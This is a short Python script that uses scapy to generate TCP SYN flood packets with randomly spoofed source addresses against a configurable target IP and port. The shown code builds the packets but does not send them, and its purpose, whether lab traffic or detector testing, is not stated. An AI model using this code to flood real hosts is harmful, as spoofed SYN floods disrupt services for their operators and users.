from scapy.all import IP, TCP
import random
import socket
import struct

def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def generate_syn_flood(num_packets=500, target_ip="10.0.0.5", target_port=80, spoof_ips=True):
    packets = []
    
    for _ in range(num_packets):
        src_ip = random_ip() if spoof_ips else "192.168.1.100"
        sport = random.randint(1024, 65535)
        
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
        packets.append(pkt)
        
    return packets
